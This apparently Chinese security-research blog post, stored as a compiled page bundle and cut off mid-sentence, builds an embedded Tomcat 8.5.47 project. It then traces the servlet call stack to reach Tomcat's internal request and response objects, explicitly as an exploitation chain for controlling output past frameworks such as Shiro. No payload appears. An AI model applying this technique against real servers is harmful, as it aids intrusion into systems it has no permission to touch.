Tomcat\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e00\u4e2aJava\u7a0b\u5e8f\uff0c\u6211\u4eec\u770b\u770bTomcat\u7684\u542f\u52a8\u6d41\u7a0b\uff1a"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\u542f\u52a8JVM\u5e76\u6267\u884cTomcat\u7684",(0,t.jsx)(n.code,{children:"main()"}),"\u65b9\u6cd5\uff1b"]}),"\n",(0,t.jsx)(n.li,{children:"\u52a0\u8f7dwar\u5e76\u521d\u59cb\u5316Servlet\uff1b"}),"\n",(0,t.jsx)(n.li,{children:"\u6b63\u5e38\u670d\u52a1\u3002"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u542f\u52a8Tomcat\u65e0\u975e\u5c31\u662f\u8bbe\u7f6e\u597dclasspath\u5e76\u6267\u884cTomcat\u67d0\u4e2ajar\u5305\u7684",(0,t.jsx)(n.code,{children:"main()"}),"\u65b9\u6cd5\uff0c\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u628aTomcat\u7684jar\u5305\u5168\u90e8\u5f15\u5165\u8fdb\u6765\uff0c\u7136\u540e\u81ea\u5df1\u7f16\u5199\u4e00\u4e2a",(0,t.jsx)(n.code,{children:"main()"}),"\u65b9\u6cd5\uff0c\u5148\u542f\u52a8Tomcat\uff0c\u7136\u540e\u8ba9\u5b83\u52a0\u8f7d\u6211\u4eec\u7684webapp\u5c31\u884c\u3002"]}),"\n",(0,t.jsx)(n.h3,{id:"\u521b\u5efamaven\u9879\u76ee",children:"\u521b\u5efamaven\u9879\u76ee"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u521b\u5efawebapp\u6a21\u677f",src:r(55030).A+"",width:"1604",height:"1360"})}),"\n",(0,t.jsx)(n.h3,{id:"\u4fee\u6539pomxml",children:"\u4fee\u6539pom.xml"}),"\n",(0,t.jsxs)(n.p,{children:["\u5f15\u5165tomcat\u4f9d\u8d56\u5305\uff0c\u4fee\u6539",(0,t.jsx)(n.code,{children:"pom.xml"}),"\u6587\u4ef6\uff0c\u5f15\u5165\u4f9d\u8d56 ",(0,t.jsx)(n.code,{children:"tomcat-embed-core"})," \u548c ",(0,t.jsx)(n.code,{children:"tomcat-embed-jasper"}),"\uff0c\u5f15\u5165\u7684 Tomcat \u7248\u672c ",(0,t.jsx)(n.code,{children:"<tomcat.version>"})," \u4e3a ",(0,t.jsx)(n.strong,{children:"8.5.47"}),"\u3002"]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"tomcat-embed-core"})," \u4f9d\u8d56\u5305\u542b javax.servlet \u4e0b\u7684\u5185\u5bb9\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u518d\u989d\u5916\u5f15\u5165\u4f9d\u8d56 ",(0,t.jsx)(n.strong,{children:"javax.servlet-api"}),"\u3002"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<properties>\n    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    <maven.compiler.source>1.7</maven.compiler.source>\n    <maven.compiler.target>1.7</maven.compiler.target>\n    <tomcat.version>8.5.47</tomcat.version>\t\x3c!-- \u8bbe\u5b9atomcat\u7248\u672c --\x3e\n  </properties>\n\n<dependency>\n      <groupId>org.apache.tomcat.embed</groupId>\n      <artifactId>tomcat-embed-core</artifactId>\n      <version>${tomcat.version}</version>\n      <scope>provided</scope>\n    </dependency>\n    <dependency>\n      <groupId>org.apache.tomcat.embed</groupId>\n      <artifactId>tomcat-embed-jasper</artifactId>\n      <version>${tomcat.version}</version>\n      <scope>provided</scope>\n    </dependency>\n    \x3c!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper --\x3e\n    <dependency>\n      <groupId>org.apache.tomcat</groupId>\n      <artifactId>tomcat-jasper</artifactId>\t\x3c!-- idea \u8bc6\u522b\u4e0d\u51fa\u6765\uff0c\u8981\u5355\u72ec\u5f15\u5165\u8fd9\u4e2a\u4f9d\u8d56 --\x3e\n      <version>${tomcat.version}</version>\n    </dependency>\n\n    \x3c!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --\x3e\n    <dependency>\n      <groupId>org.apache.tomcat</groupId>\n      <artifactId>tomcat-catalina</artifactId>\t\x3c!-- idea \u8bc6\u522b\u4e0d\u51fa\u6765\uff0c\u8981\u5355\u72ec\u5f15\u5165\u8fd9\u4e2a\u4f9d\u8d56 --\x3e\n      <version>${tomcat.version}</version>\n    </dependency>\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u521b\u5efajava\u4ee3\u7801\u6587\u4ef6\u5939",children:"\u521b\u5efaJava\u4ee3\u7801\u6587\u4ef6\u5939"}),"\n",(0,t.jsxs)(n.p,{children:["\u521b\u5efamaven\u89c4\u8303\u7684\u4ee3\u7801\u5b58\u653e\u6587\u4ef6\u5939",(0,t.jsx)(n.code,{children:"java"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u521b\u5efajava\u76ee\u5f55",src:r(89760).A+"",width:"2334",height:"1256"})}),"\n",(0,t.jsx)(n.h3,{id:"\u521b\u5efa\u542f\u52a8\u7c7b",children:"\u521b\u5efa\u542f\u52a8\u7c7b"}),"\n",(0,t.jsxs)(n.p,{children:["\u4ee5",(0,t.jsx)(n.code,{children:"TomcatMain"}),"\u4e3a\u4f8b\uff0c\u521b\u5efa\u540e\u542f\u52a8\u8bbf\u95ee",(0,t.jsx)(n.code,{children:"http://localhost:8080/"}),"\u5c31\u53ef\u4ee5\u770b\u5230hello world\u754c\u9762\u4e86"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'import org.apache.catalina.Context;\nimport org.apache.catalina.LifecycleException;\nimport org.apache.catalina.WebResourceRoot;\nimport org.apache.catalina.startup.Tomcat;\nimport org.apache.catalina.webresources.DirResourceSet;\nimport org.apache.catalina.webresources.StandardRoot;\n\nimport java.io.File;\n\n/**\n * @author d4m1ts\n */\npublic class TomcatMain {\n    public static void main(String[] args) throws LifecycleException {\n        // \u542f\u52a8tomcat\n        Tomcat tomcat = new Tomcat();\n        tomcat.setPort(8080);\n        tomcat.getConnector();\n\n        // \u521b\u5efawebapp\n        // \u521b\u5efa\u4e0a\u4e0b\u6587\uff0c\u540e\u9762\u8981\u7edd\u5bf9\u8def\u5f84\n        Context context = tomcat.addWebapp("","/Users/d4m1ts/d4m1ts/java/TomcatEcho/src/main/webapp");\n        WebResourceRoot resources = new StandardRoot(context);\n        resources.addPreResources(new DirResourceSet(resources, "/WEB-INF/classes",new File("target/classes").getAbsolutePath(), "/"));\n        context.setResources(resources);\n\n        tomcat.start();\n        tomcat.getServer().await();\n\n    }\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u542f\u52a8\u540e\u6548\u679c",src:r(33865).A+"",width:"870",height:"168"})}),"\n",(0,t.jsx)(n.h3,{id:"\u521b\u5efaservlet",children:"\u521b\u5efaservlet"}),"\n",(0,t.jsxs)(n.p,{children:["\u76f4\u63a5\u5728",(0,t.jsx)(n.code,{children:"java"}),"\u76ee\u5f55\u4e0a\u70b9\u51fb\u9f20\u6807\u53f3\u952e",(0,t.jsx)(n.code,{children:"New"}),"\u53ef\u80fd\u6ca1\u6709",(0,t.jsx)(n.code,{children:"Create New Servlet"}),"\u7b49\u9009\u9879\u6765\u5feb\u901f\u521b\u5efaservlet-api\uff0c\u9700\u8981\u6267\u884c\u4e0b\u5217\u7684\u4e00\u4e9b\u64cd\u4f5c\u6765\u6dfb\u52a0\u4e0a\uff08\u6709\u7684\u53ef\u4ee5\u76f4\u63a5\u770b\u4e0b\u9762\u521b\u5efa\u90e8\u5206\uff09\uff1a"]}),"\n",(0,t.jsx)(n.p,{children:"1\u3001\u5c06src\u6807\u8bb0\u6210Sources\u6587\u4ef6"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u6807\u8bb0\u4e3asources\u6587\u4ef6",src:r(12025).A+"",width:"2036",height:"1672"})}),"\n",(0,t.jsx)(n.p,{children:"2\u3001\u914d\u7f6esource root"}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsx)(n.p,{children:"\u6211\u7684servlet\u5199\u5728src\\main\\java\u91cc\uff0c\u6240\u4ee5\u5c31\u52fe\u9009\u7b2c\u4e00\u4e2a\u3002\u8981\u662f\u6253\u7b97\u5728\u591a\u4e2a\u6587\u4ef6\u4e0bCreate New Servlet \uff0c\u90a3\u5c31\u628asrc\u7684\u90fd\u52fe\u4e0a\u3002"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8bbe\u7f6esource root",src:r(62531).A+"",width:"2048",height:"1686"})}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"\u5feb\u901f\u521b\u5efaservlet\uff1a"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u521b\u5efaServlet",src:r(43780).A+"",width:"1336",height:"1598"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"\u7f16\u5199\u4ee3\u7801\uff1a"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'import javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n@WebServlet(name = "HelloServlet", urlPatterns = "/hello")\npublic class HelloServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType("text/html");\n        PrintWriter writer = response.getWriter();\n        writer.write("hello world");\n        writer.flush();\n    }\n}\n\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u5b9e\u73b0\u6548\u679c",src:r(34952).A+"",width:"930",height:"136"})}),"\n",(0,t.jsx)(n.h2,{id:"servlet\u8fc7\u7a0b\u5206\u6790",children:"servlet\u8fc7\u7a0b\u5206\u6790"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u6211\u4eec\u7f16\u5199\u7684servlet\u5904\u4e0b\u4e2a\u65ad\u70b9\uff0c\u7136\u540e\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\uff0c\u89c2\u5bdf\u8c03\u7528\u6808"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"doGet:18, HelloServlet\nservice:634, HttpServlet (javax.servlet.http)\nservice:741, HttpServlet (javax.servlet.http)\ninternalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)\ndoFilter:166, ApplicationFilterChain (org.apache.catalina.core)\ninvoke:199, StandardWrapperValve (org.apache.catalina.core)\ninvoke:96, StandardContextValve (org.apache.catalina.core)\ninvoke:528, AuthenticatorBase (org.apache.catalina.authenticator)\ninvoke:139, StandardHostValve (org.apache.catalina.core)\ninvoke:81, ErrorReportValve (org.apache.catalina.valves)\ninvoke:87, StandardEngineValve (org.apache.catalina.core)\nservice:343, CoyoteAdapter (org.apache.catalina.connector)\nservice:798, Http11Processor (org.apache.coyote.http11)\nprocess:66, AbstractProcessorLight (org.apache.coyote)\nprocess:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)\ndoRun:1500, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)\nrun:49, SocketProcessorBase (org.apache.tomcat.util.net)\nrunWorker:1149, ThreadPoolExecutor (java.util.concurrent)\nrun:624, ThreadPoolExecutor$Worker (java.util.concurrent)\nrun:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)\nrun:748, Thread (java.lang)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230\uff1a"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"1-3\u884c\u662fservlet\u5904\u7406\u8fc7\u7a0b"}),"\n",(0,t.jsx)(n.li,{children:"4-5\u884c\u662ffilter\u5904\u7406\u8fc7\u7a0b"}),"\n",(0,t.jsx)(n.li,{children:"\u518d\u5411\u4e0b\u5c31\u662ftomcat\u7684\u5404\u79cd\u521d\u59cb\u5316\u8fc7\u7a0b"}),"\n"]}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsxs)(n.p,{children:["\u8003\u8651\u5230\u4e00\u4e9b\u7ec4\u4ef6\u5982",(0,t.jsx)(n.code,{children:"Shiro"}),"\u3001",(0,t.jsx)(n.code,{children:"JFinal"}),"\u90fd\u6709\u5168\u5c40\u62e6\u622a\u5668\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u975e\u5e38\u901a\u7528\uff0c\u6700\u597d\u662f\u5728tomcat\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u5c31\u83b7\u53d6\u5230",(0,t.jsx)(n.code,{children:"response"}),"\u7136\u540e\u5b9a\u5236\u4fee\u6539\uff1b"]}),(0,t.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u7684\u5806\u6808\u6765\u770b\uff0c\u5c31\u662f\u4ece>=\u7b2c\u516d\u884c\u53bb\u5bfb\u627e\uff0c\u8d8a\u9760\u540e\u5c31\u8bf4\u660e\u5728\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u8d8a\u65e9\uff0c\u5229\u7528\u6548\u679c\u8d8a\u597d\u3002"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u5229\u7528\u94fe\u6316\u6398",children:"\u5229\u7528\u94fe\u6316\u6398"}),"\n",(0,t.jsx)(n.h3,{id:"response\u83b7\u53d6",children:"response\u83b7\u53d6"}),"\n",(0,t.jsx)(n.admonition,{type:"tip",children:(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\u627e\u5230",(0,t.jsx)(n.code,{children:"response"}),"\u5bf9\u8c61"]}),"\n",(0,t.jsx)(n.li,{children:"\u5206\u6790\u5b83\u5982\u4f55\u521d\u59cb\u5316\u7684\uff08\u5b83\u662f\u600e\u4e48\u6765\u7684\uff09"}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"\u83b7\u53d6\u5230\u5b83\u521d\u59cb\u5316\u540e\u7684\u5b9e\u4f8b"})}),"\n",(0,t.jsx)(n.li,{children:"\u901a\u8fc7\u5b83\u53bb\u63a7\u5236\u8f93\u51fa"}),"\n"]})}),"\n",(0,t.jsx)(n.p,{children:"\u5e73\u65f6\u6211\u4eec\u8981\u62ff\u5230\u4e00\u4e2a\u5185\u5b58\u4e2d\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"\u53cd\u5c04"}),"\n",(0,t.jsx)(n.li,{children:"\u56de\u6eaf\u5206\u6790\uff0c\u5e94\u7528\u662f\u600e\u4e48\u521d\u59cb\u5316\u8fd9\u4e2a\u53d8\u91cf\u7684\uff0c\u627e\u5173\u8054\u51fd\u6570\u3001\u7c7b\u3001\u7c7b\u53d8\u91cf\u7b49\uff0c\u518d\u5f97\u5230\u8fd9\u4e2a\u53d8\u91cf"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5206\u6790\u4e0a\u9762\u7684\u8c03\u7528\u6808\uff0c\u9664\u53bb\u540e\u671f\u5bf9",(0,t.jsx)(n.code,{children:"servlet"}),"\u548c",(0,t.jsx)(n.code,{children:"filter"}),"\u7684\u5904\u7406"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"invoke:199, StandardWrapperValve (org.apache.catalina.core)\ninvoke:96, StandardContextValve (org.apache.catalina.core)\ninvoke:528, AuthenticatorBase (org.apache.catalina.authenticator)\ninvoke:139, StandardHostValve (org.apache.catalina.core)\ninvoke:81, ErrorReportValve (org.apache.catalina.valves)\ninvoke:87, StandardEngineValve (org.apache.catalina.core)\nservice:343, CoyoteAdapter (org.apache.catalina.connector)\nservice:798, Http11Processor (org.apache.coyote.http11)\nprocess:66, AbstractProcessorLight (org.apache.coyote)\nprocess:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)\ndoRun:1500, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)\nrun:49, SocketProcessorBase (org.apache.tomcat.util.net)\nrunWorker:1149, ThreadPoolExecutor (java.util.concurrent)\nrun:624, ThreadPoolExecutor$Worker (java.util.concurrent)\nrun:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)\nrun:748, Thread (java.lang)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4ece\u4e0b\u5411\u4e0a\u6328\u7740\u770b\uff0c\u53d1\u73b0\u6574\u4e2a\u8c03\u7528\u8fc7\u7a0b\u4e2d\u6700\u521d\u4f7f\u7528\u5230",(0,t.jsx)(n.code,{children:"response"}),"\u7684\u5c31\u662f\u7b2c8\u884c\u7684",(0,t.jsx)(n.code,{children:"service:798, Http11Processor (org.apache.coyote.http11)"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"service:798, Http11Processor (org.apache.coyote.http11)",src:r(60711).A+"",width:"2474",height:"1278"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8bf4\u660e",(0,t.jsx)(n.code,{children:"response"}),"\u548c",(0,t.jsx)(n.code,{children:"resquest"}),"\u5728\u8fd9\u4e4b\u524d\u5c31\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5411\u4e0a\u56de\u6eaf\u5206\u6790"]}),"\n",(0,t.jsxs)(n.p,{children:["\u67e5\u770b\u8fd9\u4e2a",(0,t.jsx)(n.code,{children:"response"}),"\u7684\u5b9a\u4e49\uff0c\u662f",(0,t.jsx)(n.code,{children:"org.apache.coyote.AbstractProcessor"}),"\u62bd\u8c61\u7c7b\u4e2d\u7684\u4e00\u4e2a\u53d8\u91cf",(0,t.jsx)(n.code,{children:"Response response"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"org.apache.coyote.AbstractProcessor#response",src:r(73474).A+"",width:"1354",height:"590"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8ddf\u4e00\u4e0b\u8fd9\u4e2a",(0,t.jsx)(n.code,{children:"response"}),"\u662f\u5982\u4f55\u521d\u59cb\u5316\u7684"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"find usage",src:r(62189).A+"",width:"1702",height:"228"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53d1\u73b0\u662f",(0,t.jsx)(n.code,{children:"AbstractProcessor"}),"\u7c7b\u7684\u6784\u9020\u51fd\u6570\u521d\u59cb\u5316\uff0c\u4e14",(0,t.jsx)(n.code,{children:"resquest"}),"\u5bf9\u8c61\u4e2d\u5305\u542b\u4e86",(0,t.jsx)(n.code,{children:"response"})]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsxs)(n.p,{children:["\u4e5f\u5c31\u662f\u8bf4\uff1a\u6211\u4eec\u540e\u671f\u5982\u679c\u62ff\u5230\u4e86",(0,t.jsx)(n.code,{children:"resquest"}),"\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5176\u62ff\u5230",(0,t.jsx)(n.code,{children:"response"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u6ce8\u610f\uff1a\u60f3\u8981\u8c03\u7528\u4e0b\u9762\u7684",(0,t.jsx)(n.code,{children:"protected"}),"\u6784\u9020\u51fd\u6570\uff0c\u5b9e\u9645\u662f\u9700\u8981\u8c03\u7528\u4e0a\u9762\u7684",(0,t.jsx)(n.code,{children:"publuc"}),"\u6784\u9020\u51fd\u6570\uff0c\u518d\u901a\u8fc7\u4e0a\u9762\u7684\u6784\u9020\u51fd\u6570\u8c03\u7528\u4e0b\u9762\u6709",(0,t.jsx)(n.code,{children:"response"}),"\u7684\u6784\u9020\u51fd\u6570"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209142613612",src:r(99597).A+"",width:"1558",height:"764"})}),"\n",(0,t.jsxs)(n.p,{children:["\u800c\u5728",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u7c7b\u4e2d\u8981\u7528\u5230\u8fd9\u4e2a",(0,t.jsx)(n.code,{children:"protected"}),"\u4fee\u9970\u7684",(0,t.jsx)(n.code,{children:"response"}),"\u53d8\u91cf\uff0c\u5927\u6982\u7387\u662f\u7ee7\u627f\u4e86",(0,t.jsx)(n.code,{children:"AbstractProcessor"}),"\uff0c\u53bb\u770b\u4e0b\uff0c\u5f88\u660e\u663e"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u7ee7\u627f\u5173\u7cfb",src:r(74419).A+"",width:"950",height:"140"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u6211\u4eec\u8fd8\u8981\u627e\u4e00\u4e0b\uff0c",(0,t.jsx)(n.code,{children:"response"}),"\u5728",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u7c7b\u4e2d\u662f\u5982\u4f55\u521d\u59cb\u5316\u7684\uff0c\u770b\u4e00\u4e0b\u5b83\u7684\u6784\u9020\u51fd\u6570\uff0c\u662f\u8c03\u7528\u4e86\u7236\u7c7b",(0,t.jsx)(n.code,{children:"AbstractProcessor"}),"\u7684\u6784\u9020\u51fd\u6570"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"Http11Processor\u6784\u9020\u51fd\u6570",src:r(32334).A+"",width:"1708",height:"446"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5",(0,t.jsx)(n.code,{children:"request"}),"\u548c",(0,t.jsx)(n.code,{children:"response"}),"\u521d\u59cb\u5316\u662f\u5728",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u7684\u6784\u9020\u51fd\u6570\u4e2d\u521d\u59cb\u5316\u7684"]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u73b0\u5728\u601d\u8def\u6bd4\u8f83\u660e\u786e\uff0c",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u7c7b\u521d\u59cb\u5316\u540e\uff0c\u901a\u8fc7\u5404\u79cd\u65b9\u6cd5\u62ff\u5230",(0,t.jsx)(n.code,{children:"request"}),"\u6216\u8005",(0,t.jsx)(n.code,{children:"response"}),"\u5b9e\u4f8b\u5373\u53ef\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u901a\u8fc7",(0,t.jsx)(n.code,{children:"protected"}),"\u6765\u4fee\u9970\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5f53\u524d\u7c7b\u3001\u540c\u5305\u548c\u5b50\u7c7b\u4e2d\u6765\u67e5\u627e\u662f\u5426\u6709\u76f8\u5173\u7684\u51fd\u6570\u6765\u83b7\u53d6\u8fd9\u4fe9\u5b9e\u4f8b"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"java\u4fee\u9970\u7b26",src:r(17700).A+"",width:"361",height:"202"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8fd8\u662f\u67e5\u627e",(0,t.jsx)(n.code,{children:"request"}),"\u548c",(0,t.jsx)(n.code,{children:"response"}),"\u5b9e\u4f8b\u7684usage"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"usage",src:r(7778).A+"",width:"1636",height:"326"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53d1\u73b0",(0,t.jsx)(n.code,{children:"org.apache.coyote.AbstractProcessor"}),"\u63d0\u4f9b\u4e86\u4e00\u4e2a",(0,t.jsx)(n.code,{children:"getRequest"}),"\u65b9\u6cd5\u6765\u83b7\u53d6",(0,t.jsx)(n.code,{children:"request"}),"\u5bf9\u8c61"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209144852773",src:r(39376).A+"",width:"754",height:"294"})}),"\n",(0,t.jsxs)(n.p,{children:["\u83b7\u53d6\u5230",(0,t.jsx)(n.code,{children:"request"}),"\u5bf9\u8c61\u540e\uff0c\u518d\u901a\u8fc7",(0,t.jsx)(n.code,{children:"Request"}),"\u7c7b\u63d0\u4f9b\u7684",(0,t.jsx)(n.code,{children:"getResponse"}),"\u65b9\u6cd5\u6765\u83b7\u53d6",(0,t.jsx)(n.code,{children:"response"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209145324208",src:r(30614).A+"",width:"918",height:"228"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6700\u540e\u901a\u8fc7",(0,t.jsx)(n.code,{children:"response"}),"\u7684",(0,t.jsx)(n.code,{children:"doWrite()"}),"\u65b9\u6cd5\uff0c\u5199\u8fdb\u5185\u5bb9\uff0c\u8fd4\u56de\u7ed9\u524d\u7aef"]}),"\n",(0,t.jsxs)(n.p,{children:["\u4e5f\u53ef\u4ee5\u901a\u8fc7",(0,t.jsx)(n.code,{children:"setHeader()"}),"\u65b9\u6cd5\u5199\u5165\u5230\u8fd4\u56de\u5934\u4e2d"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209145459900",src:r(86868).A+"",width:"1156",height:"324"})}),"\n",(0,t.jsx)(n.p,{children:"\u6240\u4ee5\u4e00\u6761response\u90e8\u5206\u5229\u7528\u94fe\u5982\u4e0b\uff1a"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u7ee7\u627f\u4e86",(0,t.jsx)(n.code,{children:"AbstractProcessor"}),"\uff0c\u6240\u4ee5\u8c03\u7528",(0,t.jsx)(n.code,{children:"Http11Processor#getRequest()"}),"\u5c31\u7b49\u4e8e",(0,t.jsx)(n.code,{children:"AbstractProcessor#getRequest()"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"Http11Processor#getRequest() -> \nAbstractProcessor#getRequest() ->\n\tRequest#getResponse() ->\n\t\tResponse#doWrite()\n"})}),"\n",(0,t.jsx)(n.h3,{id:"http11processor\u7c7b\u76f8\u5173",children:"Http11Processor\u7c7b\u76f8\u5173"}),"\n",(0,t.jsxs)(n.p,{children:["\u524d\u9762\u6316\u6398\u90e8\u5206\u8bf4\u4e86\uff0c\u83b7\u53d6\u4e86",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u5b9e\u4f8b\u540e\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6",(0,t.jsx)(n.code,{children:"request"}),"\uff0c\u4e5f\u5c31\u53ef\u4ee5\u83b7\u53d6",(0,t.jsx)(n.code,{children:"response"}),"\uff0c\u6211\u4eec\u7684\u76ee\u7684\u4e5f\u8fbe\u6210\u4e86\uff0c\u4f46\u662f",(0,t.jsxs)(n.strong,{children:["\u5982\u4f55\u6765\u83b7\u53d6",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u5b9e\u4f8b\u6216\u8005",(0,t.jsx)(n.code,{children:"Http11Processor request\u3001response"}),"\u7684\u53d8\u91cf"]}),"\u5462"]}),"\n",(0,t.jsxs)(n.p,{children:["\u7ee7\u7eed\u5411\u524d\u5206\u6790\uff0c\u770b\u4ec0\u4e48\u65f6\u5019\u51fa\u73b0\u4e86",(0,t.jsx)(n.code,{children:"Http11Processor"}),"\u7c7b\u7684\u5b9e\u4f8b\uff1b\u53d1\u73b0\u662f\u5728",(0,t.jsx)(n.code,{children:"org.apache.coyote.AbstractProtocol.ConnectionHandler#process"}),"\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff0c\u521d\u59cb\u5316\u662f\u901a\u8fc7",(0,t.jsx)(n.code,{children:"connections.get(socket)"}),"\u6765\u8d4b\u503c"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209152439431",src:r(91947).A+"",width:"3422",height:"1454"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4f46722\u884c\u8fd9\u4e2a\u65f6\u5019\u83b7\u53d6\u7684",(0,t.jsx)(n.code,{children:"processor"}),"\u503c\u4e3anull\uff0c\u56e0\u4e3a",(0,t.jsx)(n.code,{children:"connections"}),"\u503c\u4e3a\u7a7a\uff0c\u5728806\u884c\u7684\u65f6\u5019\u624d\u6dfb\u52a0\u5185\u5bb9\u5230",(0,t.jsx)(n.code,{children:"connections"}),"\u4e2d"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209160753875",src:r(18601).A+"",width:"1758",height:"896"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u6211\u4eec\u91cd\u65b0\u4e0b\u4e2a\u65ad\u70b9\u5206\u6790\u4e00\u4e0b",(0,t.jsx)(n.code,{children:"processor"}),"\u662f\u5982\u4f55\u8d4b\u503c\u7684\uff0c\u53ef\u4ee5\u770b\u5230",(0,t.jsx)(n.code,{children:"connections"}),"722\u884c\u521d\u59cb\u5316\u7684\u65f6\u5019\u957f\u5ea6\u662f0\u